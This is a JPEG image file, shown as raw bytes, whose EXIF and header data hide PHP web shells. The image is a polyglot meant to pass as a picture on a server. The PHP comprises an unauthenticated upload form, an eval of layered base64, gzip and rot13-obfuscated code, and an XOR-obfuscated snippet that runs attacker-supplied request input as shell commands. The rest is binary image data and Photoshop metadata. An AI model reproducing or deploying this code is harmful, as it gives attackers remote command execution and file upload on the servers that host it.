����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>Real Shit</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��ÿØÿà JFIF  H H  ÿá Exif  MM *          	
      	      	             	      	$(       1   5  	,2      
b;      
zGF       GI     c  ‚˜      
€‡i      
†œ›    
  ¦œœ    
  °œ    
  ºœž    
  ÄœŸ    
  Îê      þ  Øê   <?=eval("?>".base64_decode("77+977+977+977+9EEpGSUbvv70BAQHvv71477+9eO+/ve+/ve+/ve+/ve+/ve+/vUV4aWbvv73vv71NTe+/vSrvv73vv73vv70I77+9BQENCu+/vQLvv73vv73vv71F77+977+977+9SgEa77+9Be+/ve+/ve+/vQHvv73vv73vv73vv70BG++/vQXvv73vv73vv70B77+977+977+977+9ASjvv70D77+977+977+9Ae+/vQLvv73vv70CE++/vQPvv73vv73vv70B77+9Ae+/ve+/ve+/ve+/ve+/ve+/vTwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPiNJIExPVkUgWU9VIEVWRVJEQVkjPC90aXRsZT4NCiAgICA8bGluayBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjMuMC1hbHBoYTEvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCINCiAgICAgICAgaW50ZWdyaXR5PSJzaGEzODQtR0xobFRROGlSQUJkWkxsNk8zb1ZNV1NrdFFPcDZiN0luMVpsMy9KcjU5YjZFR0dvSTFhRmt3N2NtREE2ajZnRCIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNi4zLjAvY3NzL2FsbC5taW4uY3NzIg0KICAgICAgICBpbnRlZ3JpdHk9InNoYTUxMi1TemxyeFdVbHBmdXpRK3BjVUNvc3hjZ2xRUk5BcS9EWmpWc0MwbEU0MHhzQURzZmVRb0V5cEUrZW53Y09pR2prL2JTdUdHS0hFeWpTb1ExelZpc2FuUT09Ig0KICAgICAgICBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiByZWZlcnJlcnBvbGljeT0ibm8tcmVmZXJyZXIiIC8+DQo8L2hlYWQ+DQoNCjxib2R5Pu+/ve+/ve+/ve+/ve+/vXjvv73vv73vv70B77+977+977+9eO+/ve+/ve+/vQHvv73vv73vv71D77+9AwICAwICAwMDAwQDAwQFCAUFBAQFDQoHBwYIDA0KDAwLDQoLCw0KDhIQDQoOEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU77+977+977+9QwEDBAQFBAUJBQUJFA0KCw0KFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTvv73vv73vv70RCO+/vTzvv71kAwEi77+9AhEBAxEB77+977+977+9H++/ve+/vQEFAQEBAQEB77+977+977+977+977+977+977+977+9AQIDBAUGBwgJDQoL77+977+977+977+9EO+/vQIBAwMCBAMFBQQE77+977+9AX0BAgPvv70EEQUSITFBBhNRYQcicRQy77+977+977+9CCNC77+977+9FVLvv73vv70kM2Jy77+9CQ0KFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXrvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv70fAe+/vQMBAQEBAQEBAQHvv73vv73vv73vv73vv73vv70BAgMEBQYHCAkNCgvvv73vv73vv73vv70R77+9AgECBAQDBAcFBATvv70BAnfvv70BAgMRBAUhMQYSQVEHYXETIjLvv70IFELvv73vv73vv73vv70JIzNS77+9FWJy77+9DQoWJDTvv70l77+9FxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXrvv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv73vv70MAwHvv70CEQMR77+9P++/ve+/vVPvv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70o77+977+977+9KO+/ve+/ve+/vSjvv73vv73vv70oA++/ve+/vQ0KDQogICAgPD9waHAgZXZhbCgnPz4nLmJhc2U2NF9kZWNvZGUoZ3ppbmZsYXRlKHN0cl9yb3QxMyhjb252ZXJ0X3V1ZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCdGVmRWenF0UUVINy9kd0VVZHludTd1N2EvYS9pY2g5SVE5SVQ1c3pNWjlYMHJhaDRMN0N5bVpqTEFuOXpOSjUrbWFIZlBzekhyZnJCQWdqcFl1TVh4MW1FNDRZV1JENWNjd1l1VDkzK1ZXdy9hWlJQdDhMeDhhbkdTbnI4d3JYdmFRRFVZS2lIaWtlZjlVRVk2OXl6K3FxRU0vb0NEdHVMdEtCSjVmSlhUWnIvN2ZtbmZXdy9zbTJmbkJzMW9MbDJrVDIzZ2ViemtJRUFqWk80TUtBTjJJeG1UQTRnVFp0TmpDekIvcXZJTGxUTUtvZ2lHMDB6ZUl4UkpWMzNFSlhMZmZTUGcyZjRkVzZlT3VHOVhVcVU2a2hnUFVIclhOZjFObmIrcXRxYlVqV3FoMzNwb1drRyt4MUpZM2k5TlJMRFRXVHJ3YS9Ib2V2dU80UkFQeW04ZWR1em0rQWFGamFWRUg5VmhUSEwzcVhOT0E4UEN5Uk1YUlhnZWgxeEd6MWZ4U3VlUEJtUjhZaUNFMDVuVFJpbWNUSzJCZm9LV1lBcWYxVm9iejVDUW5wbnJabUVFZ1ZFNWtEc05qcko0dDYyeVZvTG9TeDhXaHF2WUp6Q1dBNjF3T0FNZTJkMk52NWZ0WXkrSXR2QTBGVWJFRmlELzczS2NmT1N4SlF3Z3VxTzhUeXM4dGwvVklOQURFRW5SNkhNcnJKQWlVYnAxMStWcUNUK3NNMVV6TEZyOTExNlV2UkZacDZqMUl5bUdNK1VxWERPbThXRzFycTYyRzZrKzcxMVdialhLSHYxVjlGYjdHazBKYUJUUlZBbHg0b2YwcFN0ZWxjQVo4ZXBXeDdtTzFCS3RrQndWQm5mdWtVVVBPWHYzSmo2OXoydHU3WUdMYWJkYnBZNGR3K1IwcW5wckFDWStjMlFrQjEySDRVWUNHbGs3eGIzaU1rbnJsR1V4YnhOaHR6MW5aaUtUWk1GZ0ViK0RnVDBNK2k2M2VFNVpoeThRWFlpQ3ZtckVCcDZIcFBoYVMxemlZSnlPaU45Z2FvMG4zL1ZPdnZtR1poUGFkRDNSZXByTlBFZEt2L1kwb2oyL0gwNnZxWWdaMm9PWTR3RDJ6MlA4R2JCSWxISFhlRGUwN1lYZEh4Nld6QmFOMERRZkROR3B0VytadGVmd3cxTDhmMFVQclB1a1cyQWFHS3dIelhEd3hNS1hLVVRQMy9WUllmblV1ekw2c1VUNUh4cndFR1RIMmVXUjlKL09Ldm9aQ2tVbFVHTDRNTWRJNXY4YmVYdVRWdlNmdS84UFczQ2dhR1NUeXV6cVVYNVV2ZklTRTR5MmhGengzcndZdVB3OHdMSnZiK1V1dEtSQ28zd1RqUGQvTndESVBKWEZXVVlLdzF2QmxsRlJtdXE2bm5QdWZ6SXEzN1dHWEdtNEdSMy95TEFUd2I2dzF6cWJOeFh0UGk1VUJYVU83RkRKS3g4RDE5aW9CcVl1eG4yRjV2YXdUdTlVOWlvc0FlN2t5VUt1R0EzK0hSc0UzTVdKak5VdkVKUDI5NS8xU1laMWVkMGdWQ3c0UUQxYlNjcTZ3SFI0S2xhRklxM0h3emRuNWFpZzczWFRsaTVVUGFCQW4waCtsaHowTCtxbVg4SExYTTdVUE13Mk15cWJRYy9hRm5qZmwyc0tRdUc2dm02ZWdabHpqMUFRdENzVkMxZ2M2eERVWmRUZjVXYWgyRnl6UFZXa25wa0NxUWVyMzdlT0ZLUHR1S2R1aC9NYmVEbWdNdWxLREl1RGppVmV3d3FCc1hwSHB1L2FnZlpXYzYyc1A1dWNBY3c5SGhNSzZMWlg4WUp2ODI5WEg2MGJRZGw2ZGZYQnlpTzdNV2ZUOTNuVTVWbDl0NTc2UjBNcFovcWZzeld2NHYxNXZQaG1PVlUrMEIzQUV3Y2lJN1pUTGo5by9SQ2UzOE1yY1EvVXMzOVNzZWMveXB1WFVlNi80N0Jzb21LbGl1THowWmsrcno4RUd4TEVLaXFaaVcyWSsxbWhlZlFTbzJwRTlNUG9KNGJTZXJ2dDMxQndjVmhKTzl1NDZQQUpYdDBFcW51MHlzSGhOeXUyV2JLdTYxUEdkTUZINnE5WnRlaDBhQzNuNHg0K1ZlMXQ0OVFhMCtpVEVmUjlGa0FmWEVZRmlQWW0yeGNCd0NtMXpieTl5TG1zK1cyNTlPc2hkQTNNOXVaalNUK1ZmZndBTjFsTW1zbTFnS1ExVUdveklhUzY4bU01dWpIdzRNWmxwNkhDME9wNVVrZjZwTW5UZU52VTlyaytQSjVJSlpaTGZ3UWtIU2VDWWhhcXpidWIwSm8zMS92TXNLbEtiRG5naWhOQnVDcHIvNHhBTVh4WE9uZzlNbVMvbFdwZDBOMDExMmhidlpPSjBOK0ZwbmtCMEYxRXova2E4R25ZcldYS2w0Wlc2T1Mvc3ErOUZTZDlRQ0g4ZWk5M0lMY1RPeWpZaWFJS1BJekp1SDNITFhnQmdmbkhpVy9yd1ZFY1M0d0R5MEVIQWpJSWxVZWcvRHNEOVdwdkpWckFlWE1ST284UnI5b1FWaVJiSjlORHlBYzdSVk14MW1DVm1DTWxtYkgyWEFhalFQUU05cHlUbjQxdkw3L1ZZNERaZkdjT3hydUhZeDlsTTZ5ZVU4UG1DS2RKamNhM0hpZDRKQ3lZdzNSR25WZVpkSVd3bXdUZnRnSEJsNU9QYmx6bE96Nm9zV2lvRHI3UU9Mek56YzUwcFF1YmNyZTZqaGFSYk9Kcit6QWVud3Q5R2JmMFY4bENkenZub09NL1ExSWhkek5XT2pDQTFKclIxS3o1N3NKRGpnYzEzbGQreXdVYmJVaGplb01hQ0pITGFQV3hISWlCLzV1S25RMHJlNUlzemx3c0tyNDh2Ym9wYmNoZHhFVDFzZFlxKzU2cFI4MC9LeTMvQ0ppazl6TW1SOXh5RnZ5b3FSelRWYXlsNjlFYlQ4eTVMbjRxa1lmRGtMM0NtM2Q2amZVL29KbS9vcys1OEVrc2pQRGMvbUpsRFRmcmZwRnlXMmlodVpWV2IydUJpQlViblRRUStvbm5yaUxkWi9LWkxTUkppd1NOd2tQZGpvV0V2V0xoekNkcGdRa1hnVWVuRVNLZVBUZ0RTS21NNnZLOGZGell4U3ppQkMvMFFRTGc1R1dzOE8wM0FUamdGY3gxQzdNbEhGSzZxbjVWd254R1l5aW5OSDZ6TVJ4SXlCT1phbVNNeDlFdUYxNC9KZzNBM0NzWXBRb29MMjJSaFI1MkpRczk2Vms1cTA4ZUFUcjdqcnVuajdJNXM0Z2tWa0ZJMU1QZnZUeUNYZ3c3elAzWjhVUG9xSENKRDRGK1JPakcxYUQ5KzV2ZnhXOCs3eGNGM0tNS0pMUjNGcXdhbDF3dW54QjB2OUovNjQzM0E1MWxzRmtFNU1OdXR5STlXbEFPTzRZaDN5N2hrajduRmJlUmU4Z3FRczFVS3FXZzJnbHV2eVdmUk5PU0JiaVQvSXdNcnRMbUJRWkc0WmMxTWxuWnMvbkwwbytWdU0yK0RLTVFwUEIxUDdhS240SUdzMER1UHQ3R1VhWVRLQVhOQ254MitNS3lZV091ZmpqWVMxMmVsN2ZNcmdNNmxLM1VvdHhaSkR6aUIwMUtaVHE1VlJIYVJBbEplMnVjeEhqWUZsSk1SZ3JNVFIweWtxRFRqVEU3Nit5Q1FIVkNWYjhYUi82bEwwZ1JDYWZ0bmJwT0hHdzRwQVZZM3M4YnRVUFBLTkIxQmp0NWc4OVFvUmlDelRaWHhYRExLVnpnWDNtbjBFOUQ4NFpRQVpnSVZOemlkdUhZZ1ZwelhOUGM5andQc2Q1WUtndjFTUDEvRWJmZ1Y2M0YzdTAxRlFjZmNEaEU4RHBkZEc0bFZGZU5mUk42ejNmUHBHL2NkdmpJZjdldzJkeDZpRFo4K0FMQnpJdTZLOTZDbzk2VVhRRDBZVWpNcFZpSld1Ny9FYTBoTGo1dERNQ1RuODcrQlZZRlAvamFGWEZPdWNBcUtZTkVPamROWnJGOG9FWTJ6aVdwSTI4U1FtWkI1MDhpbkhwSkJNUzFsTnpnaGhSQmVYQ1p2TTFubU5KSkY5dFcwNXNMdjRxcFdvT3oveWVjR2xKK1JyTWVxViszRW0zNWZYNGJFckxWWStXR0UxcG5aRmxYM2hZa00yMjJRWlczTWY1L2F1OEphZC9OdzZHYUVtclJyeEZldlBqY0F0NWxrTXdFUlFaTFJpZ2U2WFdJVnBnaXpPdnp1dkxGUUFHcjlPN2EyNzB6TnpGam5Nc3RLUzFlZHFWcVE2dU5sUFdLb3lPcHEyeERkZkhBSk5LQTdkOU90TWE0SC9QNGdyUE52NVZwV1A1bTNDTU52dExsZ3ZEOU1pempyU2pGWExtNnRSZ1R2Tjd4MFd2RlNGNTZPTlJaaEdUbEJRMXFCYjdib3RCWjQ4c3JoY2lCenRHZUZ2VFYvdUlPa3NWRE54VjkvVXdkUTFtSWlrMUd1dnR5WVlENjlUM2V6Y1AzYitzaU9OYlRHTGZCcWEzUi9KbVoyYU1Nak5JajcrTXdmSlorV1J0cE1OSTQ4T1RMdFFNSGd4bjdZbXVvbjZSL0R1eDYyYmswcU9HOWtFN2Z3Q0VtUnF4Vm5VQWljeVV4cnpZSDJWNFhOTnZaMFJSQU9vSlZMN1RLNjFmM2RHL3FjWUpJSm1pMkZJLzNkZEJTaGdnUWlGdzg5SENEenorT0VGdnZZU25LRmhkS2RMdFN6WU1NU0FkbU5oQnZxbm1hdEY2YmNUVUxheGo1b1E1YWNWcEdmR0tGQlEySVBKTFlDckNXYURMYk04NFBjYnN3Sk1XZllpcjlaYnByK0lkUGZUQ3RFNmpZLzA4MFBsRmVxUWpQa0x6ZmVmNzJsMDFiUktkV3N0MWRhaFp2ZDEwZzl5NmYrZ2pObDgrL3cwbS9HemhZSzg5bnFUVEovWDN0YVpjTi9PeDZ4TmZRb0N4bTNwVTE5RHI0NVhiblhFUUxhelZwNi9pN3N1S1AySW5ZMm04OWJhcnpwNlgrQU5CeENNOUpyaVBCa1VlU2tEdnc0VTd5cDVRaWpIQzRlUDkzVFgwUVYrRUtpOUlpaFZMMkU5ZjNIS09MV1F5WlNKN3p0bkZiVDJQbDZtMkQ4RTl5WVgwMEpLeDBrSEp2ZEZ0LzNMQjYzcjIxcXdhc3hkTkpGbWFSdGl2VjBuQXBWT0k2dmF1SkVId3dpVVpNT04yTC82T1BCc0sxZHZMeDZXc1UzdjlPY1k5V1NiWlZ4RjM1SkhMWmRUV2wvb05yUGYvR1RIRFp3QWRiRlpYUTNIZWFQS3hjQ0J1cFpvSmVaUmVYbFk4MmlXSEs3L3A5enBsVHRBcUQyd1JHa1JGbnFzS1hpcVRpZTJDVDF2aWZGQlJOakYvbUlZMHZ0WGNtZlByN3RVS3VPRGI0aXBBTDRhSFZ4d0xpS014ZkpvMDFwNk1IYzROSW5aRXhKTk9RV3UxbXVzd3FkcHV2SjVRWVY2dnVCYmtXdlJrMFp6cXZjbjJXb2Y2c2Yzc2hJaHNoMHplTmlxVXZLUEg1MVRHQjFtYnl4bXcxYWxrTkxuaHYwcXE3QWx0SEQzNFlQeXRxdG50b0UybnlIdUJndEpNc09Dd01JN0lmT243N0E1b1FFY1NNQjVrQy9yQTZPa1gzK2Vyai8zSHY2NUFDRG92dnFLMEF5WksydG9QZkMxUGExTGNYQjdrQzFvOHoxSzZaV3pPWkdOU3l0UVNmSHUrdENSSzZOSmp6M1UwYmRFcFlxOW9DZDF4RnNzVHBtL0FSQlN2K1MwaUNMZE9XTDNFWFhYWk1weWxFTHc2bHVJRTJ3aEJZZU4zdnVJTE9UVmw0NU8xU0o1V2J3ZmlRYy96RDNybUVSOG1ZTXBZNW91d2hNMHNja2ZuNzdldjVUTkpvNmFadnpkc1VlQ2hYeDdDR3FFVnZETnlIYmM3NSszakZKNkVwbXd6d2dkVDZ2MWlNbTNFWC9yeXVyM0NDTmRQNFJxd2plZW5sNStFN1VQSi9nUjZSZXcvWldxRm9kMVVQdXBMQW8xK3Yya3ZqbnUrUUZZSFJ1djE1N3dCUmJXVlUxRWNiVC9JSGk1dTBscVZDUXZjZU1YcVRGT1ZlVDZPMlhKWGlldkpEa2daOVZEMnRCTFdtNmgwL3lLVUpxL3NobWp1OGw3WWlNM1ZWRkZEMXFEUUpCaDRvcnJpWlc4RVpUMVptajZFdFBqZ3RXaUdUUEJtNFBCeHlRdmhESXNnOU5lQVdnNUJnNGEyYXFHNGx6SXJmTWZ5K29iYXdrWGNzdnFqSWtXRGM2U3NyYVIxK042YkRhRjZOTHhCZlBxbXlPRnZNaEc4VDg3WXNDZlBDamtNWFo0bFlseWFLNUdZTjFjaWV5T0Y4UUthZjZYd3I4cXBzNjZyUkd6Q0FoTE1rbTkyOERvUnBSYTBjbnJ5R0VaamVEbWc0cUhub0cwWUZlNVM0YnZnVmRSa2kvQldYbE9Wb0xtMVNBMG9MQ1pwenAzbkZLU0xCWFB6S3JUYWc0V1ZIYVBNVjN4OGNpTHZKeGd3NG9nNit3WEk2KzQ1S0wvN2gvVzNYRjNVL1lCdVZpOUo2WDdHS1hxQUxhVWYvUlZJWkFrR1BTa2QzMlorZERRVUV1bUE2K3ZYR0lCMEVOMzVTU01TNm95NzJxeklGc1BYSU5helBoOTJSZzJwMkt2VUZFNVBROC83azh5SytWNjAyaTd2VllOajd3TmNPUUtGMHJWcW13U3dWclMwUUpjUFh0SUo4Ym56ZGlqNUo4a1F5NmVEWXRUWE5pL2h4M0JCcjM1ZGJ0eWpzNmV6U2l3dW4xSWlhK1FIU0toc1NBeFdaME5nenE1aHBNbTdibTk3NXFmUytjdWNqb201ZEtDc243OEtDV0J6NDNVQ2V3UW1KSHJQcVlqNWhDczMzanlpb1J2L29UakZlRE9LTzV3OUxHUFdsK0hNNXFsZDlpTGZMSmlKZ3dONkVleGV5NUFSY2JoVUp0K3MxeWVoQW11RHZzZ3k2QjM4NEpDRHIvSTF1UVpyeFFoNnZaRzA1TjZlNThPOFJNY1hjVldMdzMxL0ZUWEw3WFlVd1dSMGMyRXd6OEFYbFN4MzNrZktPSmJhUjc2VmtoU3lSNnp3OHRxZVZKbTVSbFRzbU54K1FrcWdzWnNQUk5HV2N3N3hWcnJUSXZLY1VYbDE4dURDZnZaUkw1bGxEREI0UE94VlFmS2VOQ3QrMzU0UllvMmtZWjRIZ1F4TFMzNW9VMWFPOWIyL2N3RGZMSHB2OW5xZXpxbjVmZGFWMjFlVDM2NmRSb296cjFiQ2hqYjIzNXgrdHdSbG1OVGZrSTVDOUc5WHVONzVaZkhYUjVBempJMUJyZWZMSERmajhIMlZhQWpRTlhUWndoZllYbkp2WUlWdlU1WXRUc3RrcVNzVHdmUnJPM3N5MHArNWFqVVlQWDZFak5DMjJ1bTBWd1VuQjNBdUg3WlpXOWcwMktuUmJXM1FHbmF6d2grczRKcktBdjdjbDdncHRoRGREbGFTVldKaG02VUxoL01xRVI5R1dEK0pvTmR3NDJFSnYwUVZpOFUxUXU3TFBEekZTQVlqRjh6WUtPWEZpalFCNTVLOEJLNEVWRVh1dnM3RDR6WUxlTkJLV0N4ZzhMbkM3a21FaW5BZ0NQYUtWWk1xeVFmcnhOR0NzWFl4ZWVsamVuZ0VOb1lYYS9hTGI5cDZwdlhFN3VFWllpWW1ETFhxYlZ3RHlxUkJFeHlkUmNnR1pFMXFvbVVkTHJFWkNtMUtnVnI3WEU5bGhlKzhkOVBNaDIxOURScUJZSGpWZzY5Q3RmU3p5Z3BHU04rUUMwZnZqQlBzV3E2UkhPNE5HYlZvUjdsT1p1TTNqOWs0ZG55UDc3VWJvZG5JUmpzNWlUek5vMTV3ZnJLREVHb0d5TFljVnM2Yys5T0crL00wcC9STVZ6UjUwNnNHcWhsSkY1MjBsNjBROFpOUENzOVQvWklGMUFOSVhVWWx6cnJGVGoxOUY1UEt4L2xaQjlwZ0k0d3hrTEpYMzhxM1Z4cjRlME9wbTdNSGVjWWRZVEpZczFjYVoxbUJQb2xFYmc4SE9qbnBJeUN5MHJSakpRbXVmdm1heW9zeDV1TlJFK3hqeDdYZFprWnMrQVZiZG5MKzZJbXFZdkhuZUZEcG8xTlkvMFJtZHBHNjA2ZE5HUklGTG4vMHF5VVFkb3YrQXkybmo5VWhZdHdUaEhuSmJJSzZ2TnVYR25ld2JBMW5laHVJWGxFVllPbDhlY3U5cUJraXVyMGFpdHNwSk5HWml1U3M1bFQ5SlU4bDVDV3VvcDUxOVZ0cVFFZ3RyL2ZPRy94dFZNY3Z0dWc0NFZBS3YrSjg5RC9jVDByb0FvK3JmODdmMysvdkh3PT0nKSkpKSkpKTs="));?>

?><?="<br>";?>dnthirteen@h34rtbl33d.today:~$ <?="<".("{"^"+").("{"^")").("{"^">").">";@$_++;$__ = ${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[!$_];$___ = `$__` ?: $__(${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[$_]);?><?=($___."</".("{"^"+").("{"^")").("{"^">").">");__HALT_COMPILER();?>1337:13:37 13:37:666ÿÿ
  1337:13:37 13:37:666ÿÿ
 null  null   ˆ"       ˆ'    š       null      |      ’       ’       ’	     _  ’‘    04  ’’    04       ÿÿ          
        
¤        ¤    š  ¤       ¤	       ¤
       ê     p    ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         1997:12:11 15:28:59 1997:12:11 15:28:59   n u l l   n u l l   n u l l   n u l l   n u l l                 &      .(             6      Â       H      H   ÿØÿÛ C 		

 $.' ",#(7),01444'9=82<.342ÿÛ C			

2!!22222222222222222222222222222222222222222222222222ÿÀ  
 
! ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? Ñ×|AâDÔõ%·†Ö}Ibm>ec.Ý |¥F¯ß wlWdÞ+½…ŒSxcRóPí-Ñ—#®á‘èp(×À’ÿ Ä×N7\Ù<e˜òöùnv«ŸlW¦ZÙ@O$Æ¹?… ÿÙÿíjPhotoshop 3.0 8BIM%                     8BIMí      H     H    8BIM&               ?€  8BIM
        x8BIM        8BIMó     	         8BIM
       8BIM'     
        8BIMõ     H /ff  lff       /ff  ¡™š       2    Z         5    -        8BIMø     p  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè  8BIM       8BIM         8BIM          @  @    8BIM         8BIM    I              
   
   
 U n t i t l e d - 1                                 
   
                                            null      boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   slicesVlLs   Objc        slice      sliceIDlong       groupIDlong       originenum   ESliceOrigin   
autoGenerated    Typeenum   
ESliceType    Img    boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   urlTEXT         nullTEXT         MsgeTEXT        altTagTEXT        cellTextIsHTMLbool   cellTextTEXT        	horzAlignenum   ESliceHorzAlign   default   	vertAlignenum   ESliceVertAlign   default   bgColorTypeenum   ESliceBGColorType    None   	topOutsetlong       
leftOutsetlong       bottomOutsetlong       rightOutsetlong     8BIM      8BIM        8BIM          
   
      @    ÿØÿà JFIF  H H  ÿí Adobe_CM ÿî Adobe d€   ÿÛ „ 			



ÿÀ  
 
" ÿÝ  ÿÄ?          	
         	
 3 !1AQa"q2‘¡±B#$RÁb34r‚ÑC%’Sðáñcs5¢²ƒ&D“TdEÂ£t6ÒUâeò³„ÃÓuãóF'”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö7GWgw‡—§·Ç×ç÷ 5 !1AQaq"2‘¡±B#ÁRÑð3$bár‚’CScs4ñ%¢²ƒ&5ÂÒD“T£dEU6teâò³„ÃÓuãóF”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö'7GWgw‡—§·ÇÿÚ   ? ·ÕºÇ_nf^+jf=½@TîŸMq·nÖ´ún©»j}Ò^Ú¿ÂÙé®“ö·Vÿ Ê—ý/Cùæ=ãÿ „ÿ î×þ ¹Î»ÿ .ž>“?œþ—ô¿õŸÿ Ý•Õýýë©)ÿÙ 8BIM!     U       A d o b e   P h o t o s h o p    A d o b e   P h o t o s h o p   7 . 0    8BIM        ÿáßhttp://ns.adobe.com/xap/1.0/ <?xpacket begin='ï»¿' id='W5M0MpCehiHzreSzNTczkc9d'?>
<?adobe-xap-filters esc="CR"?>
<x:xapmeta xmlns:x="adobe:ns:meta/" x:xaptk="XMP toolkit 2.8.2-33, framework 1.5">
	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:iX="http://ns.adobe.com/iX/1.0/">
		<rdf:Description about="" xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/">
			<xapMM:DocumentID>adobe:docid:photoshop:e4e9b767-808f-11ea-b398-e7491f16d242</xapMM:DocumentID>
		</rdf:Description>
		<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"/><rdf:Description xmlns:MicrosoftPhoto="http://ns.microsoft.com/photo/1.0/"><MicrosoftPhoto:CameraSerialNumber>null</MicrosoftPhoto:CameraSerialNumber><MicrosoftPhoto:DateAcquired>2013-12-11T15:29:16.570</MicrosoftPhoto:DateAcquired><MicrosoftPhoto:FlashManufacturer>null</MicrosoftPhoto:FlashManufacturer><MicrosoftPhoto:FlashModel>null</MicrosoftPhoto:FlashModel><MicrosoftPhoto:LensManufacturer>null</MicrosoftPhoto:LensManufacturer><MicrosoftPhoto:LensModel>null</MicrosoftPhoto:LensModel><MicrosoftPhoto:Rating>99</MicrosoftPhoto:Rating><MicrosoftPhoto:LastKeywordXMP><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
